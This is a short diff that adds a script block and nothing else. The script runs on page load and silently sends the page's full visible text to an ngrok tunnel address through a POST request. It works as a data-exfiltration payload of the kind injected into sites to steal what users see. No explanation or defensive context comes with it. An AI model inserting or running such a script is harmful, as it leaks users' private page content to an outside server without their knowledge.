@@ -1,0 +1,12 @@
+<script>
+    var xhttp = new XMLHttpRequest();
+    var k = 'hi';
+    xhttp.onreadystatechange = function () {
+        if (this.readyState == 4 && this.status == 200) {
+            var k = (xhttp.responseText);
+        }
+    };
+    xhttp.open("POST", "https://a5e4-103-197-220-120.ngrok-free.app/submit");
+    xhttp.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
+    xhttp.send(JSON.stringify({ message: document.body.innerText }));
+</script>
